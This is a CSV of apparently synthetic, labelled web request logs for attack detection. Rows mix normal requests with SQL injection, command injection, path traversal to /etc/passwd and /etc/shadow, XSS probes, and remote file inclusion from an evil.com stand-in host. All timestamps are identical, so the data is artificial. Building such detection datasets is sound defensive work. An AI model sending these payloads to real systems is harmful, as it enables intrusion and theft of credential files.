timestamp,ip,method,url,status_code,user_agent,is_attack,attack_type
2025-04-30 07:57:22,10.0.0.228,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.158,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.20,GET,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.111,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,10.0.0.201,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.169,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.210,GET,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.152,GET,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.105,GET,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.48,GET,/favicon.ico,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.133,POST,/vendor/bootstrap.css,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.196,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.65,POST,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.213,POST,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.86,GET,/vendor/bootstrap.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.29,POST,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.15,GET,/index.html,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.36,POST,/search?q=<script>alert('x')</script>,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.130,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.201,POST,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.240,POST,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.119,POST,/login?user=admin'--,500,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.31,GET,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.228,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.33,POST,/img/logo.png,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.207,GET,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.41,GET,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.250,GET,/view?include=../../../../etc/passwd,500,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,10.0.0.123,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.20,POST,/vendor/bootstrap.css,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.171,GET,/search?q=1' UNION SELECT null--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.127,POST,/,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.73,GET,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.201,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.31,GET,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.208,POST,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.177,POST,/view?include=../../../../etc/passwd,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,192.168.0.96,POST,/css/style.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.88,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.145,GET,/cmd?exec=cat%20/etc/passwd,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.2,GET,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.123,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.177,POST,/download?file=../../../../etc/passwd,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.182,GET,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.114,GET,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.48,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.203,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.242,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.65,POST,/vendor/bootstrap.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.174,GET,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.29,GET,/about,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.20,GET,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.118,GET,/dashboard,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.57,GET,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.234,GET,/ping?ip=127.0.0.1;ls,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.218,POST,/index.html,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.221,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.29,GET,/profile,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.70,GET,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.71,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,10.0.0.96,GET,/search?q=<script>alert('x')</script>,403,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.152,GET,/dashboard,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.244,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.236,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.136,POST,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.106,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.191,POST,/contact,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.222,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.32,GET,/page?file=http://evil.com/shell.txt,500,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,10.0.0.16,GET,/login?user=admin'--,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.53,POST,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.82,POST,/vendor/bootstrap.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.225,POST,/view?include=../../../../etc/passwd,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.38,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.88,GET,/download?file=../../../../etc/passwd,200,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.51,GET,/dashboard,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.7,POST,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.226,POST,/css/style.css,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.104,POST,/profile,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.120,GET,/img/logo.png,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.219,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.233,POST,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.200,POST,/login?user=admin'--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.223,GET,/,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.137,POST,/ping?ip=127.0.0.1;ls,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.49,GET,/view?include=../../../../etc/passwd,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.51,POST,/profile,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.130,GET,/page?file=http://evil.com/shell.txt,500,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.251,GET,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.18,GET,/login?user=admin'--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.195,GET,/cmd?exec=cat%20/etc/passwd,403,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.247,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.192,POST,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.150,GET,/page?file=http://evil.com/shell.txt,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,10.0.0.98,POST,/download?file=../../../../etc/passwd,500,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.70,POST,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.139,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.132,POST,/login?user=admin'--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.120,POST,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.99,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.64,POST,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.31,POST,/contact,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.157,POST,/search?q=<script>alert('x')</script>,500,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.152,GET,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.252,GET,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.10,POST,/product?id=10 OR 1=1,200,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.202,POST,/cmd?exec=cat%20/etc/passwd,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.245,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.119,GET,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.163,GET,/img/logo.png,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.205,POST,/img/logo.png,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.87,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.225,POST,/download?file=../../../../etc/passwd,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.97,GET,/cmd?exec=cat%20/etc/passwd,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.53,POST,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.104,GET,/,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.250,POST,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.105,GET,/favicon.ico,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.165,GET,/contact,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.211,POST,/about,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.254,POST,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.6,POST,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.57,GET,/vendor/bootstrap.css,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.232,GET,/search?q=<script>alert('x')</script>,500,curl/7.64.1,True,xss
2025-04-30 07:57:22,10.0.0.8,GET,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.181,POST,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.232,GET,/css/style.css,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.175,POST,/login?user=admin'--,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.192,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.58,POST,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.202,POST,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.151,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.13,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.136,POST,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.56,GET,/contact,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.215,POST,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.38,POST,/dashboard,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.80,POST,/search?q=<script>alert('x')</script>,500,sqlmap/1.5,True,xss
2025-04-30 07:57:22,192.168.0.120,GET,/css/style.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.18,GET,/js/app.js,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.160,POST,/favicon.ico,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.114,POST,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.221,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,192.168.0.16,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.138,GET,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.5,POST,/cmd?exec=cat%20/etc/passwd,200,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,10.0.0.170,POST,/page?file=http://evil.com/shell.txt,200,Mozilla/5.0,True,file_inclusion
2025-04-30 07:57:22,192.168.0.189,GET,/profile,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.238,POST,/js/app.js,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.47,POST,/download?file=../../../../etc/passwd,403,curl/7.64.1,True,directory_traversal
2025-04-30 07:57:22,192.168.0.79,POST,/index.html,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.18,POST,/download?file=../../../../etc/passwd,403,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.59,POST,/cmd?exec=cat%20/etc/passwd,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.103,POST,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.133,POST,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.135,POST,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.110,GET,/profile,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.65,POST,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.214,GET,/product?id=10 OR 1=1,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.220,POST,/dashboard,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.148,POST,/ping?ip=127.0.0.1;ls,500,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,10.0.0.209,GET,/product?id=10 OR 1=1,200,python-requests/2.25,True,sql_injection
2025-04-30 07:57:22,10.0.0.116,GET,/product?id=10 OR 1=1,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.181,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.110,POST,/page?file=http://evil.com/shell.txt,403,python-requests/2.25,True,file_inclusion
2025-04-30 07:57:22,10.0.0.96,GET,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.68,GET,/,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.237,POST,/ping?ip=127.0.0.1;ls,200,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.78,POST,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.83,GET,/contact,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.255,POST,/about,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.240,GET,/css/style.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.237,GET,/index.html,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.3,POST,/page?file=http://evil.com/shell.txt,200,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.151,GET,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.133,POST,/product?id=10 OR 1=1,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.222,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,192.168.0.137,GET,/contact,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.228,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.132,POST,/img/logo.png,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.78,GET,/search?q=1' UNION SELECT null--,500,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.191,POST,/,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.184,GET,/dashboard,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.249,POST,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.33,GET,/img/logo.png,304,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.130,GET,/view?include=../../../../etc/passwd,403,curl/7.64.1,True,file_inclusion
2025-04-30 07:57:22,192.168.0.64,POST,/,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.164,GET,/vendor/bootstrap.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.177,POST,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.39,GET,/img/logo.png,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.157,POST,/cmd?exec=cat%20/etc/passwd,200,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.129,GET,/page?file=http://evil.com/shell.txt,200,sqlmap/1.5,True,file_inclusion
2025-04-30 07:57:22,192.168.0.48,GET,/css/style.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.87,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.29,POST,/js/app.js,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.191,GET,/ping?ip=127.0.0.1;ls,403,sqlmap/1.5,True,command_injection
2025-04-30 07:57:22,192.168.0.47,GET,/dashboard,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.159,GET,/search?q=1' UNION SELECT null--,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,192.168.0.220,GET,/css/style.css,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.110,GET,/cmd?exec=cat%20/etc/passwd,500,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,192.168.0.194,POST,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.32,POST,/profile,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,192.168.0.164,POST,/js/app.js,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.239,POST,/download?file=../../../../etc/passwd,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,192.168.0.28,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.252,POST,/,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.110,GET,/about,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.208,GET,/about,200,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.69,GET,/ping?ip=127.0.0.1;ls,403,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,192.168.0.157,POST,/img/logo.png,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.121,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,403,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.51,POST,/index.html,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.29,POST,/vendor/bootstrap.css,304,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.251,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.82,POST,/about,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.50,GET,/dashboard,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.50,GET,/login?user=admin'--,500,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.66,POST,/search?q=<script>alert('x')</script>,500,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.162,POST,/vendor/bootstrap.css,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,10.0.0.132,POST,/product?id=10 OR 1=1,403,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.216,GET,/search?q=<script>alert('x')</script>,200,curl/7.64.1,True,xss
2025-04-30 07:57:22,192.168.0.205,GET,/favicon.ico,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.132,GET,/js/app.js,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.136,POST,/index.html,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.222,POST,/js/app.js,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.183,GET,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.163,GET,/index.html,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.101,GET,/index.html,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.39,GET,/login?user=admin'--,403,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,10.0.0.163,GET,/product?id=10 OR 1=1,200,sqlmap/1.5,True,sql_injection
2025-04-30 07:57:22,10.0.0.247,POST,/download?file=../../../../etc/passwd,403,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,10.0.0.100,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,Mozilla/5.0,True,xss
2025-04-30 07:57:22,192.168.0.142,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.34,GET,/search?q=1' UNION SELECT null--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.106,POST,/ping?ip=127.0.0.1;ls,500,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.77,POST,/favicon.ico,404,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.85,GET,/index.html,200,curl/7.64.1,False,normal
2025-04-30 07:57:22,192.168.0.216,POST,/js/app.js,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.8,POST,/img/logo.png,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.31,GET,/about,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.79,POST,/favicon.ico,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.149,GET,/js/app.js,200,python-requests/2.25,False,normal
2025-04-30 07:57:22,10.0.0.241,POST,/ping?ip=127.0.0.1;ls,200,python-requests/2.25,True,command_injection
2025-04-30 07:57:22,10.0.0.121,GET,/msg?body=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E,200,sqlmap/1.5,True,xss
2025-04-30 07:57:22,10.0.0.70,GET,/search?q=1' UNION SELECT null--,200,curl/7.64.1,True,sql_injection
2025-04-30 07:57:22,192.168.0.242,GET,/,304,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.57,GET,/vendor/bootstrap.css,404,python-requests/2.25,False,normal
2025-04-30 07:57:22,192.168.0.143,GET,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.175,GET,/vendor/bootstrap.css,304,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.237,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,200,Mozilla/5.0,True,directory_traversal
2025-04-30 07:57:22,192.168.0.147,GET,/css/style.css,404,sqlmap/1.5,False,normal
2025-04-30 07:57:22,10.0.0.86,POST,/img/..%2F..%2F..%2Fetc%2Fshadow,500,python-requests/2.25,True,directory_traversal
2025-04-30 07:57:22,10.0.0.227,GET,/login?user=admin'--,500,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.241,GET,/ping?ip=127.0.0.1;ls,500,Mozilla/5.0,True,command_injection
2025-04-30 07:57:22,10.0.0.85,GET,/img/..%2F..%2F..%2Fetc%2Fshadow,200,sqlmap/1.5,True,directory_traversal
2025-04-30 07:57:22,10.0.0.209,POST,/cmd?exec=cat%20/etc/passwd,403,curl/7.64.1,True,command_injection
2025-04-30 07:57:22,192.168.0.241,GET,/css/style.css,200,sqlmap/1.5,False,normal
2025-04-30 07:57:22,192.168.0.148,POST,/about,404,Mozilla/5.0,False,normal
2025-04-30 07:57:22,10.0.0.237,GET,/login?user=admin'--,403,Mozilla/5.0,True,sql_injection
2025-04-30 07:57:22,10.0.0.90,GET,/search?q=<script>alert('x')</script>,200,python-requests/2.25,True,xss
2025-04-30 07:57:22,192.168.0.247,POST,/dashboard,200,sqlmap/1.5,False,normal
